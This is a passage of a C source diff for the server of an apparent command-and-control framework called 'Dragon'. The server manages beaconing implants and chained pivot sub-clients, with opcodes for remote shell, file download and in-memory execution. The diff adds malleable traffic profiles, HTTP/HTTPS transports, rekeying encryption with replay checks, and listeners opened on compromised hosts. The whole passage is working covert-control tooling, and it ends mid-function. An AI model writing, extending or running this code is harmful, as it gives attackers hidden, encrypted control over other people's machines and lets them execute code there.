@@ -18,9 +18,11 @@
 #include <readline/readline.h>
 #include <readline/history.h>
 #include <sys/stat.h>
+#include <fcntl.h>
 
 #include "crypto_dragon.h"
 #include "transport.h"
+#include "malleable_profile.h"
 #include <sodium.h>
 
 #define MAX 2048
@@ -30,6 +32,8 @@
 #define MARKER_LEN (sizeof(END_MARKER)-1)
 #define SHELL_QUEUE_SIZE 32
 #define FILE_CHUNK_SIZE 1900
+
+static malleable_profile_t g_profile;
 
 static uint8_t server_priv[32];
 
@@ -57,6 +61,7 @@ enum PacketOpcode {
     OPCODE_HANDSHAKE_PUBKEY = 0x10,
     OPCODE_HANDSHAKE_ACK = 0x11,
     OPCODE_CLIENT_ID_ASSIGN = 0x12,
+    OPCODE_CLIENT_HANDSHAKE = 0x13,
     OPCODE_FILE_DOWNLOAD_REQ   = 0x14,
     OPCODE_FILE_DOWNLOAD_CHUNK = 0x15,
     OPCODE_FILE_DOWNLOAD_END   = 0x16,
@@ -66,7 +71,8 @@ enum PacketOpcode {
     OPCODE_FILE_ACK = 0x1A,
     OPCODE_EXEC_MEM_START = 0x1B,
     OPCODE_EXEC_MEM_CHUNK = 0x1C,
-    OPCODE_EXEC_MEM_ARGS  = 0x1D
+    OPCODE_EXEC_MEM_ARGS  = 0x1D,
+    OPCODE_LISTENER_ACK = 0x1E
 };
 
 static volatile sig_atomic_t shell_got_sigint = 0;
@@ -96,6 +102,14 @@ typedef struct {
     pthread_cond_t  not_empty;
 } ShellQueue;
 
+typedef struct RemoteListener {
+    char name[32];
+    int port;
+    char transport[16];
+    malleable_profile_t profile;
+    struct RemoteListener *next;
+} RemoteListener;
+
 typedef struct {
     char *id;
     char father[ID_LEN];
@@ -104,16 +118,22 @@ typedef struct {
     transport_conn_t *conn;
     struct sockaddr_in address;
     int level;
-    int listener_port;
+    char listener_name[32];
     char *status;
     char *test;
     time_t last_beacon;
     _Atomic int in_shell;
-    uint8_t key_enc[KEY_LEN];
-    uint8_t base_iv[NONCE_LEN];
-    uint8_t chain_key[KEY_LEN];
+    uint8_t key_tx[KEY_LEN];
+    uint8_t iv_tx[NONCE_LEN];
+    uint8_t ck_tx[KEY_LEN];
     dr_ctr_t tx_ctr;
-    dr_ctr_t rx_ctr;
+    uint64_t tx_epoch;
+    uint8_t key_rx[KEY_LEN];
+    uint8_t iv_rx[NONCE_LEN];
+    uint8_t ck_rx[KEY_LEN];
+    uint64_t rx_epoch;
+    uint64_t last_rx_ctr;
+    
     dr_ctr_t shell_ctr64_rx;
     dr_ctr_t shell_ctr64_tx;
     pthread_mutex_t crypto_mu;
@@ -128,10 +148,16 @@ typedef struct {
     char xfer_dl_local[512];
     uint64_t xfer_dl_bytes;
     int xfer_dl_active;
+
+    malleable_profile_t profile;
+    int profile_received;
+    int beacon_timeout;
+    RemoteListener *remote_listeners;
 } CLIENT;
 
 CLIENT* clients[MAX_CLIENTS];
 pthread_mutex_t clients_collection_mutex = PTHREAD_MUTEX_INITIALIZER;
+static pthread_mutex_t g_send_mu = PTHREAD_MUTEX_INITIALIZER;
 
 /* =========================================================================
  * Pending query
@@ -161,6 +187,111 @@ mongoc_uri_t *uri;
 mongoc_client_t *client_db;
 bson_error_t error;
 mongoc_collection_t *collection;
+
+/* =========================================================================
+ * Global listeners struct and functions 
+ *
+ * ====================================================================== */
+
+typedef struct GlobalListener {
+    char name[32];
+    int port;
+    char transport[16];
+    int client_id;        
+    malleable_profile_t profile;
+    struct GlobalListener *next;
+} GlobalListener;
+
+GlobalListener *g_all_listeners = NULL;
+pthread_mutex_t g_listener_registry_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+void registry_add_listener(const char *name, int port, const char *transport, int client_id, const malleable_profile_t *prof) {
+    pthread_mutex_lock(&g_listener_registry_mutex);
+    
+    GlobalListener *gl = malloc(sizeof(GlobalListener));
+    snprintf(gl->name, sizeof(gl->name), "%s", name);
+    gl->port = port;
+    snprintf(gl->transport, sizeof(gl->transport), "%s", transport);
+    gl->client_id = client_id;
+    if (prof) gl->profile = *prof;
+    else memset(&gl->profile, 0, sizeof(gl->profile));
+    
+    gl->next = g_all_listeners;
+    g_all_listeners = gl;
+    
+    pthread_mutex_unlock(&g_listener_registry_mutex);
+}
+
+void registry_remove_listener(const char *name) {
+    pthread_mutex_lock(&g_listener_registry_mutex);
+    
+    GlobalListener **pp = &g_all_listeners;
+    while (*pp) {
+        if (strcmp((*pp)->name, name) == 0) {
+            GlobalListener *del = *pp;
+            *pp = del->next;
+            free(del);
+            pthread_mutex_unlock(&g_listener_registry_mutex);
+            return;
+        }
+        pp = &(*pp)->next;
+    }
+    
+    pthread_mutex_unlock(&g_listener_registry_mutex);
+}
+
+void registry_remove_all_for_client(int client_id) {
+    pthread_mutex_lock(&g_listener_registry_mutex);
+    
+    GlobalListener **pp = &g_all_listeners;
+    while (*pp) {
+        if ((*pp)->client_id == client_id) {
+            GlobalListener *del = *pp;
+            *pp = del->next;
+            free(del);
+        } else {
+            pp = &(*pp)->next;
+        }
+    }
+    
+    pthread_mutex_unlock(&g_listener_registry_mutex);
+}
+
+int registry_name_exists(const char *name) {
+    pthread_mutex_lock(&g_listener_registry_mutex);
+    
+    GlobalListener *gl = g_all_listeners;
+    while (gl) {
+        if (strcmp(gl->name, name) == 0) {
+            pthread_mutex_unlock(&g_listener_registry_mutex);
+            return 1;
+        }
+        gl = gl->next;
+    }
+    
+    pthread_mutex_unlock(&g_listener_registry_mutex);
+    return 0;
+}
+
+void registry_list_all() {
+    pthread_mutex_lock(&g_listener_registry_mutex);
+    
+    printf("\n=== All Listeners ===\n");
+    GlobalListener *gl = g_all_listeners;
+    if (!gl) {
+        printf("  (none)\n");
+    }
+    while (gl) {
+        if (gl->client_id == -1)
+            printf("  \"%s\" [%s] port %d (server)\n", gl->name, gl->transport, gl->port);
+        else
+            printf("  \"%s\" [%s] port %d (client %d)\n", gl->name, gl->transport, gl->port, gl->client_id);
+        gl = gl->next;
+    }
+    printf("=====================\n\n");
+    
+    pthread_mutex_unlock(&g_listener_registry_mutex);
+}
 
 /* =========================================================================
  * list_clients
@@ -433,6 +564,7 @@ CLIENT* return_client_by_id(const char *client_id) {
 #define BEACON_TIMEOUT   120
 #define CHECK_INTERVAL    30
 
+static void free_remote_listeners(RemoteListener *head);
 void *check_inactive_client(void *args) {
     (void)args;
     while (1) {
@@ -443,11 +575,22 @@ void *check_inactive_client(void *args) {
         for (int i = 0; i < MAX_CLIENTS; i++) {
             if (!clients[i] || !clients[i]->status)
                 continue;
-            if (strcmp(clients[i]->status, "active") != 0)
+            if (strcmp(clients[i]->status, "active") != 0) {
+                /* cleanup dead clients older than 2*CHECK_INTERVAL */
+                if (strcmp(clients[i]->status, "dead") == 0 &&
+                    difftime(now, clients[i]->last_beacon) > CHECK_INTERVAL * 2) {
+                    free_remote_listeners(clients[i]->remote_listeners);
+                    if (clients[i]->id) free(clients[i]->id);
+                    if (clients[i]->xfer_dl_fp) fclose(clients[i]->xfer_dl_fp);
+                    free(clients[i]);
+                    clients[i] = NULL;
+                }
                 continue;
+            }
 
             double elapsed = difftime(now, clients[i]->last_beacon);
-            if (elapsed > BEACON_TIMEOUT) {
+            int timeout = clients[i]->profile_received ? clients[i]->beacon_timeout : BEACON_TIMEOUT;
+            if (elapsed > timeout) {
                 printf("\n[BEACON] Client %s (level %d) inactive for %.0fs - marked dead\n",
                        clients[i]->id ? clients[i]->id : "?",
                        clients[i]->level, elapsed);
@@ -511,26 +654,41 @@ int deserialize_packet(PACKET_DRAGON *p, char *buffer) {
  * send_packet
  *
  * Encrypts and sends one PACKET_DRAGON. Serializes, encrypts with
- * ChaCha20-Poly1305, sends FRAME_SIZE bytes. Counter increments
+ * ChaCha20-Poly1305, sends WIRE_FRAME_SIZE bytes. Counter increments
  * per frame.
  * ====================================================================== */
 static int send_packet(transport_conn_t *conn, transport_t *trans,
-                        const uint8_t key[KEY_LEN],
+                        uint8_t key[KEY_LEN],
                         const uint8_t iv[NONCE_LEN],
-                        dr_ctr_t *ctr64,
+                        dr_ctr_t *ctr64, 
+                        uint8_t ck[KEY_LEN],
+                        uint64_t *epoch,
                         const PACKET_DRAGON *pkt)
 {
     uint8_t plain[PLAINTEXT_SIZE] = {0};
     serialize_packet((PACKET_DRAGON *)pkt, (char *)plain);
-    uint8_t frame[FRAME_SIZE];
-    if (dragon_encrypt_frame(key, iv, ctr64, plain, frame) != 0)
+    uint8_t wire[WIRE_FRAME_SIZE];
+    pthread_mutex_lock(&g_send_mu);
+    if (dragon_encrypt_frame(key, iv, ctr64, plain, wire) != 0) {
+        pthread_mutex_unlock(&g_send_mu);
         return -1;
+    }
     size_t sent = 0;
-    while (sent < FRAME_SIZE) {
-        int n = trans->send(conn, frame + sent, FRAME_SIZE - sent);
-        if (n <= 0) return -1;
+    while (sent < WIRE_FRAME_SIZE) {
+        int n = trans->send(conn, wire + sent, WIRE_FRAME_SIZE - sent);
+        if (n <= 0) {
+            pthread_mutex_unlock(&g_send_mu);
+            return -1;
+        }
         sent += (size_t)n;
     }
+    uint64_t cur = atomic_load(ctr64) - 1;
+    uint64_t new_ep = cur / REKEY_INTERVAL;
+    while (*epoch < new_ep) {
+        dragon_rekey(key, ck);
+        (*epoch)++;
+    }
+    pthread_mutex_unlock(&g_send_mu);
     return 0;
 }
 
@@ -550,6 +708,7 @@ static int decrypt_inner_payload_if_needed(PACKET_DRAGON *pkt)
         strcmp(pkt->opCode, "0x05") &&
         strcmp(pkt->opCode, "0x0E") &&
         strcmp(pkt->opCode, "0x0F") &&
+        strcmp(pkt->opCode, "0x1E") &&
         strcmp(pkt->opCode, "0x1A") &&
         strcmp(pkt->opCode, "0x15") &&
         strcmp(pkt->opCode, "0x16"))
@@ -561,13 +720,7 @@ static int decrypt_inner_payload_if_needed(PACKET_DRAGON *pkt)
     }
     uint8_t clear[sizeof(pkt->payload)];
     uint16_t clear_len;
-    dr_ctr_t *ctr;
-    if (strcmp(pkt->opCode, "0x05") == 0) {
-        ctr = &sub->shell_ctr64_rx;
-    } else {
-        ctr = &sub->rx_ctr;
-    }
-    int rc = dragon_decrypt_blob(sub->key_enc, sub->base_iv, ctr,
+    int rc = dragon_decrypt_blob(sub->key_rx, sub->iv_rx,
                                   (uint8_t*)pkt->payload,
                                   pkt->payload_size,
                                   clear, &clear_len);
@@ -584,23 +737,45 @@ static int decrypt_inner_payload_if_needed(PACKET_DRAGON *pkt)
  * into a PACKET_DRAGON. Returns 0 on success, -1 on failure.
  * ====================================================================== */
 static int receive_packet(transport_conn_t *conn, transport_t *trans,
-                           const uint8_t key[KEY_LEN],
-                           const uint8_t iv[NONCE_LEN],
-                           dr_ctr_t *ctr64,
-                           PACKET_DRAGON *p)
+                          uint8_t key[KEY_LEN],
+                          const uint8_t iv[NONCE_LEN],
+                          uint8_t ck[KEY_LEN],
+                          uint64_t *epoch,
+                          uint64_t *last_ctr,
+                          PACKET_DRAGON *p)
 {
-    uint8_t frame[FRAME_SIZE];
-    size_t got = 0;
-    while (got < FRAME_SIZE) {
-        int r = trans->recv(conn, frame + got, FRAME_SIZE - got);
-        if (r <= 0) return -1;
-        got += (size_t)r;
+    uint8_t wire[WIRE_FRAME_SIZE];
+    size_t received = 0;
+    while (received < WIRE_FRAME_SIZE) {
+        int n = trans->recv(conn, wire + received, WIRE_FRAME_SIZE - received);
+        if (n <= 0) return -1;
+        received += (size_t)n;
     }
+
+    uint64_t wire_ctr;
+    memcpy(&wire_ctr, wire, CTR_HDR);
+
+
+    if (*last_ctr != UINT64_MAX && wire_ctr <= *last_ctr) {
+        fprintf(stderr, "[REPLAY] counter %lu <= %lu\n",
+                (unsigned long)wire_ctr, (unsigned long)*last_ctr);
+        return -2;
+    }
+
     uint8_t plain[PLAINTEXT_SIZE];
-    if (dragon_decrypt_frame(key, iv, ctr64, frame, plain) != 0) {
-        printf("Decrypt failed\n");
+    if (dragon_decrypt_frame(key, iv, wire, plain, NULL) != 0) {
+        fprintf(stderr, "[receive_packet] decrypt failed\n");
         return -1;
     }
+
+    *last_ctr = wire_ctr;
+
+    uint64_t new_ep = wire_ctr / REKEY_INTERVAL;
+    while (*epoch < new_ep) {
+        dragon_rekey(key, ck);
+        (*epoch)++;
+    }
+
     return deserialize_packet(p, (char *)plain);
 }
 
@@ -639,6 +814,7 @@ typedef struct {
 } ConnectionData;
 
 typedef struct ListeningSocket {
+    char name[32];
     transport_t *trans;
     int handle;
     int port;
@@ -647,6 +823,7 @@ typedef struct ListeningSocket {
     int occupied;
     struct ListeningSocket *next;
     CLIENT *client;
+    malleable_profile_t profile;
 } ListeningSocket;
 
 ListeningSocket *head_listeners = NULL;
@@ -680,25 +857,21 @@ static void print_filtered_output(const char *buf, size_t len,
  * joined. Payload: "port|father_id". Triggers route table updates
  * on every node in the chain.
  * ====================================================================== */
-void notify_parents_of_new_client(transport_conn_t *conn,
-                                   transport_t *trans,
-                                   const uint8_t key[KEY_LEN],
-                                   const uint8_t iv[NONCE_LEN],
-                                   dr_ctr_t *ctr64,
+void notify_parents_of_new_client(CLIENT *via,
                                    const char* new_client_id,
                                    int level,
-                                   int father_port,
+                                   const char* father_listener_name,
                                    const char* father_id)
 {
     char payload[128];
-    snprintf(payload, sizeof(payload), "%d|%s", father_port, father_id);
+    snprintf(payload, sizeof(payload), "%s|%s", father_listener_name, father_id);
     PACKET_DRAGON packet = {0};
     strcpy(packet.opCode, "0x0D");
     packet.payload_size = (uint16_t)strlen(payload);
     strncpy(packet.payload, payload, sizeof(packet.payload) - 1);
     packet.target_level = level;
     strncpy(packet.target_id, new_client_id, ID_LEN - 1);
-    if (send_packet(conn, trans, key, iv, ctr64, &packet) != 0)
+    if (send_packet(via->conn, via->trans, via->key_tx, via->iv_tx, &via->tx_ctr, via->ck_tx, &via->tx_epoch, &packet) != 0)
         printf("Error notify clients for new client\n");
 }
 
@@ -717,7 +890,8 @@ static void add_client(CLIENT *c) {
     int i;
     for (i = 0; i < MAX_CLIENTS; ++i) {
         if (clients[i] == NULL || clients[i]->status == NULL
-            || strcmp(clients[i]->status, "active") != 0) {
+            || (strcmp(clients[i]->status, "active") != 0
+                && clients[i]->level <= 1)) {
             clients[i] = c;
             clients[i]->status = "active";
             break;
@@ -752,7 +926,7 @@ static void send_req_listeners(int port, int level,
                     return;
                 }
                 uint16_t blob_len = 0;
-                if (dragon_encryption_blob(dst->key_enc, dst->base_iv,
+                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                             &dst->tx_ctr,
                                             (uint8_t*)req.payload, 0,
                                             (uint8_t*)&req.payload,
@@ -763,9 +937,7 @@ static void send_req_listeners(int port, int level,
                 }
                 req.payload_size = blob_len;
             }
-            if (send_packet(curr->client->conn, curr->client->trans,
-                             curr->client->key_enc, curr->client->base_iv,
-                             &curr->client->tx_ctr, &req) == 0) {
+            if (send_packet(curr->client->conn, curr->client->trans, curr->client->key_tx, curr->client->iv_tx, &curr->client->tx_ctr, curr->client->ck_tx, &curr->client->tx_epoch, &req) == 0) {
                 create_pending_query(client_id, REQ_LISTENERS);
                 printf("Listeners list requested\n");
             } else {
@@ -803,7 +975,7 @@ static void send_req_routes(int port, int level,
                     return;
                 }
                 uint16_t blob_len;
-                if (dragon_encryption_blob(dst->key_enc, dst->base_iv,
+                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                             &dst->tx_ctr,
                                             (uint8_t*)req.payload,
                                             req.payload_size,
@@ -814,8 +986,8 @@ static void send_req_routes(int port, int level,
                 req.payload_size = blob_len;
             }
             if (send_packet(curr->client->conn, curr->client->trans,
-                             curr->client->key_enc, curr->client->base_iv,
-                             &curr->client->tx_ctr, &req) == 0) {
+                             curr->client->key_tx, curr->client->iv_tx, &curr->client->tx_ctr, curr->client->ck_tx,
+                             &curr->client->tx_epoch, &req) == 0) {
                 create_pending_query(client_id, REQ_ROUTES);
                 printf("Routes list requested\n");
             } else {
@@ -878,6 +1050,14 @@ int shell_q_pop(ShellQueue *q, PACKET_DRAGON *pkt, int timeout_ms) {
     return 0;
 }
 
+static void free_remote_listeners(RemoteListener *head)
+{
+    while (head) {
+        RemoteListener *next = head->next;
+        free(head);
+        head = next;
+    }
+}
 
 /* =========================================================================
  * handle_connection
@@ -901,36 +1081,73 @@ void *handle_connection(void *args) {
     ConnectionData *connData = (ConnectionData *)args;
     CLIENT *client = connData->client;
     struct ListeningSocket *ls = connData->listener;
- 
+
+    uint8_t ke[KEY_LEN], bi[NONCE_LEN], ck[KEY_LEN];
     if (dragon_handshake_server(client->conn, client->trans,
-                                 server_priv,
-                                 client->key_enc,
-                                 client->base_iv,
-                                 client->chain_key) != 0) {
+                                     server_priv, ke, bi, ck) != 0) {
         printf("[CRYPTO] handshake failed\n");
         client->trans->close(client->conn);
         ls->occupied = 0;
         free(connData);
         return NULL;
     }
-    client->tx_ctr = 0;
-    client->rx_ctr = 0;
+    if (strcmp(client->trans->name, "http") == 0 ||
+        strcmp(client->trans->name, "https") == 0) {
+        uint8_t srv_pub[32];
+        crypto_scalarmult_base(srv_pub, server_priv);
+        if (!send_all(client->conn, client->trans, srv_pub, 32)) {
+            printf("[CRYPTO] failed to send hs response for HTTP\n");
+            client->trans->close(client->conn);
+            ls->occupied = 0;
+            free(connData);
+            return NULL;
+        }
+    }
+    dragon_derive_keys(ke, bi, ck, 1, client->key_tx, client->iv_tx, client->ck_tx, client->key_rx, client->iv_rx, client->ck_rx);
+    sodium_memzero(ke, KEY_LEN);
+    sodium_memzero(bi, NONCE_LEN);
+    sodium_memzero(ck, KEY_LEN);
+    client->tx_ctr       = 0;
+    client->tx_epoch     = 0;
+    client->rx_epoch     = 0;
+    client->last_rx_ctr  = UINT64_MAX;
     free(connData);
+
+    /* -- Receive malleable profile (opcode 0x50) -- first encrypted frame -- */
+    PACKET_DRAGON prof_pkt;
+    if (receive_packet(client->conn, client->trans,
+                       client->key_rx, client->iv_rx, client->ck_rx, &client->rx_epoch,
+                       &client->last_rx_ctr, &prof_pkt) == 0
+        && strncmp(prof_pkt.opCode, OPCODE_PROFILE, 6) == 0)
+    {
+        if (profile_deserialize((uint8_t *)prof_pkt.payload, prof_pkt.payload_size, &client->profile) == 0) {
+            client->profile_received = 1;
+            client->beacon_timeout = client->profile.beacon_interval_s * (2 + client->level * 2);
+            if (client->beacon_timeout < 60) client->beacon_timeout = 60;
+            printf("[PROFILE] Received profile from client (beacon=%us jitter=%u%%)\n",
+                   client->profile.beacon_interval_s, client->profile.jitter_pct);
+            profile_dump(&client->profile);
+        } else {
+            fprintf(stderr, "[PROFILE] Failed to deserialize profile\n");
+        }
+    } else {
+        fprintf(stderr, "[PROFILE] Expected 0x50 profile\n");
+    }
  
     PACKET_DRAGON packet;
     if (receive_packet(client->conn, client->trans,
-                        client->key_enc, client->base_iv,
-                        &client->rx_ctr, &packet) == 0)
+                        client->key_rx, client->iv_rx, client->ck_rx, &client->rx_epoch,
+                        &client->last_rx_ctr, &packet) == 0)
     {
         char mac_address[18] = {0};
         char father_id[ID_LEN] = {0};
-        int  father_port = 0;
+        char father_listener_name[32] = {0};
         char *token = strtok(packet.payload, "|");
         if (token) strncpy(mac_address, token, sizeof(mac_address)-1);
         token = strtok(NULL, "|");
         if (token) strncpy(father_id, token, sizeof(father_id)-1);
         token = strtok(NULL, "|");
-        if (token) father_port = atoi(token);
+        if (token) strncpy(father_listener_name, token, sizeof(father_listener_name)-1);
  
         char client_id[ID_LEN];
         int  level = packet.target_level;
@@ -946,8 +1163,8 @@ void *handle_connection(void *args) {
         strncpy(packet.target_id, client_id, ID_LEN - 1);
  
         if (send_packet(client->conn, client->trans,
-                         client->key_enc, client->base_iv,
-                         &client->tx_ctr, &packet) != 0) {
+                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
+                             &client->tx_epoch, &packet) != 0) {
             perror("send id init");
         }
     } else {
@@ -964,23 +1181,45 @@ void *handle_connection(void *args) {
         fflush(stdout);
     }
  
+    int in_resp_stream = 0;
     while (1) {
         PACKET_DRAGON pack;
-        uint8_t _frame[FRAME_SIZE];
-        if (!recv_all(client->conn, client->trans, _frame, FRAME_SIZE)) {
+        uint8_t _wire[WIRE_FRAME_SIZE];
+        size_t received = 0;
+        while (received < WIRE_FRAME_SIZE) {
+            int n = client->trans->recv(client->conn, _wire + received, WIRE_FRAME_SIZE - received);
+            if (n <= 0) {
+                if (client->in_shell) goto next_iter;
+                goto disconnected;
+            }
+            received += (size_t)n;
+        }
+
+        uint64_t wire_ctr;
+        memcpy(&wire_ctr, _wire, CTR_HDR);
+        if (client->last_rx_ctr != UINT64_MAX && wire_ctr <= client->last_rx_ctr) {
+            fprintf(stderr, "[REPLAY] ctr %lu <= %lu\n",
+                    (unsigned long)wire_ctr, (unsigned long)client->last_rx_ctr);
             if (client->in_shell) continue;
             break;
         }
-        uint8_t _plain[PLAINTEXT_SIZE];
+        
         pthread_mutex_lock(&client->crypto_mu);
-        int dec_ok = dragon_decrypt_frame(client->key_enc, client->base_iv,
-                                           &client->rx_ctr, _frame, _plain);
-        pthread_mutex_unlock(&client->crypto_mu);
+        uint8_t _plain[PLAINTEXT_SIZE];
+        int dec_ok = dragon_decrypt_frame(client->key_rx, client->iv_rx, _wire, _plain, NULL);
         if (dec_ok != 0) {
             fprintf(stderr, "[handle_connection] decrypt failed\n");
             if (client->in_shell) continue;
             break;
         }
+        client->last_rx_ctr = wire_ctr;
+        uint64_t new_ep = wire_ctr / REKEY_INTERVAL;
+        while (client->rx_epoch < new_ep) {
+            dragon_rekey(client->key_rx, client->ck_rx);
+            client->rx_epoch++;
+        }
+        pthread_mutex_unlock(&client->crypto_mu);
+        
         client->last_beacon = time(NULL);
         if (deserialize_packet(&pack, (char*)_plain) != 0) {
             if (client->in_shell) continue;
@@ -1006,13 +1245,13 @@ void *handle_connection(void *args) {
  
             char mac_address_sub[18] = {0};
             char father_id[ID_LEN]   = {0};
-            int  father_port = 0;
+            char father_listener_name[32] = {0};
             char *token = strtok(pack.payload, "|");
             if (token) strncpy(mac_address_sub, token, sizeof(mac_address_sub)-1);
             token = strtok(NULL, "|");
             if (token) strncpy(father_id, token, sizeof(father_id)-1);
             token = strtok(NULL, "|");
-            if (token) father_port = atoi(token);
+            if (token) strncpy(father_listener_name, token, sizeof(father_listener_name)-1);
  
             char client_id_sub[ID_LEN];
             generate_sha1_id(mac_address_sub, client_id_sub);
@@ -1032,15 +1271,14 @@ void *handle_connection(void *args) {
             }
             strncpy(new_client->id, client_id_sub, ID_LEN - 1);
             new_client->id[ID_LEN-1] = '\0';
-            new_client->listener_port = client->listener_port;
+            strncpy(new_client->listener_name, client->listener_name, sizeof(new_client->listener_name) - 1);
+            new_client->listener_name[sizeof(new_client->listener_name) - 1] = '\0';
             add_client(new_client);
  
-            notify_parents_of_new_client(client->conn, client->trans,
-                                          client->key_enc, client->base_iv,
-                                          &client->tx_ctr,
+            notify_parents_of_new_client(client,
                                           client_id_sub,
                                           pack.target_level,
-                                          father_port, father_id);
+                                          father_listener_name, father_id);
         }
  
         /* -- handshake sub-client (0x10) -- */
@@ -1058,11 +1296,10 @@ void *handle_connection(void *args) {
             }
             uint8_t km[64];
             crypto_kdf_derive_from_key(km, 64, 0x01, "DRAGONHS", shared);
-            uint8_t key_enc_sub[KEY_LEN], base_iv_sub[NONCE_LEN];
-            uint8_t chain_key_sub[KEY_LEN];
-            crypto_generichash(key_enc_sub,   KEY_LEN,  km, 64, (uint8_t*)"enc", 3);
-            crypto_generichash(base_iv_sub,   NONCE_LEN,km, 64, (uint8_t*)"iv",  2);
-            crypto_generichash(chain_key_sub, KEY_LEN,  km, 64, (uint8_t*)"ck",  2);
+            uint8_t ke_sub[KEY_LEN], bi_sub[NONCE_LEN], ck_sub[KEY_LEN];
+            crypto_generichash(ke_sub, KEY_LEN,   km, 64, (uint8_t*)"enc", 3);
+            crypto_generichash(bi_sub, NONCE_LEN, km, 64, (uint8_t*)"iv",  2);
+            crypto_generichash(ck_sub, KEY_LEN,   km, 64, (uint8_t*)"ck",  2);
             sodium_memzero(shared, sizeof shared);
             sodium_memzero(km,     sizeof km);
  
@@ -1071,10 +1308,14 @@ void *handle_connection(void *args) {
                 printf("[ERROR] Sub-client %s not found\n", pack.target_id);
                 continue;
             }
-            memcpy(sub->key_enc, key_enc_sub, KEY_LEN);
-            memcpy(sub->base_iv, base_iv_sub, NONCE_LEN);
-            sub->tx_ctr = 0;
-            sub->rx_ctr = 0;
+            dragon_derive_keys(ke_sub, bi_sub, ck_sub, 1, sub->key_tx, sub->iv_tx, sub->ck_tx, sub->key_rx, sub->iv_rx, sub->ck_rx);
+            sodium_memzero(ke_sub, KEY_LEN);
+            sodium_memzero(bi_sub, NONCE_LEN);
+            sodium_memzero(ck_sub, KEY_LEN);
+            sub->tx_ctr      = 0;
+            sub->tx_epoch    = 0;
+            sub->rx_epoch    = 0;
+            sub->last_rx_ctr = UINT64_MAX;
             sub->status = "active";
             sub->last_beacon = time(NULL);
  
@@ -1084,7 +1325,7 @@ void *handle_connection(void *args) {
             ack.target_level = sub->level;
             strncpy(ack.target_id, sub->id, ID_LEN - 1);
             uint16_t ack_blob_len = 0;
-            if (dragon_encryption_blob(sub->key_enc, sub->base_iv,
+            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                         &sub->tx_ctr,
                                         (uint8_t*)ack.payload, 0,
                                         (uint8_t*)&ack.payload,
@@ -1093,8 +1334,8 @@ void *handle_connection(void *args) {
             }
             ack.payload_size = ack_blob_len;
             if (send_packet(client->conn, client->trans,
-                             client->key_enc, client->base_iv,
-                             &client->tx_ctr, &ack) != 0) {
+                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
+                             &client->tx_epoch, &ack) != 0) {
                 printf("[ERROR] Send 0x11 failed\n"); continue;
             }
             printf("[HANDSHAKE] 0x11 inviato a %s\n", sub->id);
@@ -1115,7 +1356,7 @@ void *handle_connection(void *args) {
             id_assign.target_level = sub->level;
             strncpy(id_assign.target_id, sub->id, ID_LEN - 1);
             uint16_t id_blob_len = 0;
-            if (dragon_encryption_blob(sub->key_enc, sub->base_iv,
+            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                         &sub->tx_ctr,
                                         (uint8_t*)id_assign.payload, 0,
                                         (uint8_t*)&id_assign.payload,
@@ -1124,8 +1365,8 @@ void *handle_connection(void *args) {
             }
             id_assign.payload_size = id_blob_len;
             if (send_packet(client->conn, client->trans,
-                             client->key_enc, client->base_iv,
-                             &client->tx_ctr, &id_assign) != 0) {
+                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
+                             &client->tx_epoch, &id_assign) != 0) {
                 printf("[ERROR] Send 0x12 failed\n"); continue;
             }
             printf("[HANDSHAKE] Sub-client %s ready\n", sub->id);
@@ -1144,14 +1385,26 @@ void *handle_connection(void *args) {
             } else if (!strcmp(pack.opCode, "0x02")) {
                 if (decrypt_inner_payload_if_needed(&pack) != 0)
                     continue;
-                printf("\n[RESP %s:%d]\n",
-                       inet_ntoa(client->address.sin_addr),
-                       ntohs(client->address.sin_port));
-                fflush(stdout);
-                write(STDOUT_FILENO, pack.payload, pack.payload_size);
-                if (pack.payload_size == 0) putchar('\n');
-                fflush(stdout);
- 
+                if (pack.payload_size == 0) {
+                    /* empty 0x02 = end-of-response terminator */
+                    if (!in_resp_stream) {
+                        printf("\n[RESP %s:%d]\n",
+                               inet_ntoa(client->address.sin_addr),
+                               ntohs(client->address.sin_port));
+                    }
+                    putchar('\n');
+                    fflush(stdout);
+                    in_resp_stream = 0;
+                } else {
+                    if (!in_resp_stream) {
+                        printf("\n[RESP %s:%d]\n",
+                               inet_ntoa(client->address.sin_addr),
+                               ntohs(client->address.sin_port));
+                        in_resp_stream = 1;
+                    }
+                    write(STDOUT_FILENO, pack.payload, pack.payload_size);
+                    fflush(stdout);
+                }
             } else if (!strcmp(pack.opCode, "0x0E")) {
                 if (decrypt_inner_payload_if_needed(&pack) != 0)
                     continue;
@@ -1213,6 +1466,53 @@ void *handle_connection(void *args) {
                     pq->used += pack.payload_size;
                 }
                 continue;
+            } else if (!strcmp(pack.opCode, "0x1E")) {
+                /* Listener ACK from client */
+                if (decrypt_inner_payload_if_needed(&pack) != 0)
+                    continue;
+                char ack_buf[128];
+                size_t alen = pack.payload_size < sizeof(ack_buf) - 1
+                            ? pack.payload_size : sizeof(ack_buf) - 1;
+                memcpy(ack_buf, pack.payload, alen);
+                ack_buf[alen] = '\0';
+
+                char *a_name  = strtok(ack_buf, "|");
+                char *a_port  = strtok(NULL, "|");
+                char *a_trans = strtok(NULL, "|");
+                char *a_stat  = strtok(NULL, "|");
+                if (!a_name || !a_port || !a_trans || !a_stat) continue;
+
+                /* identify target client */
+                CLIENT *target = client;              /* default: level 1 */
+                if (pack.target_level > 1) {
+                    target = return_client_by_id(pack.target_id);
+                    if (!target) continue;
+                }
+
+                if (strcmp(a_stat, "ok") == 0) {
+                    RemoteListener *rl = calloc(1, sizeof(RemoteListener));
+                    strncpy(rl->name, a_name, sizeof(rl->name) - 1);
+                    rl->port = atoi(a_port);
+                    strncpy(rl->transport, a_trans, sizeof(rl->transport) - 1);
+                    rl->profile = g_profile;
+                    rl->next = target->remote_listeners;
+                    target->remote_listeners = rl;
+                    int cid = -1;
+                    for (int i = 0; i < MAX_CLIENTS; i++) {
+                        if (clients[i] == target) { cid = i; break; }
+                    }
+                    registry_add_listener(a_name, atoi(a_port), a_trans, cid, &g_profile);
+                    printf("\n[ACK] Listener '%s' started on %s (port %s, %s)\n",
+                           a_name, pack.target_id, a_port, a_trans);
+                    printf("Dragon: ");
+                    fflush(stdout);
+                } else {
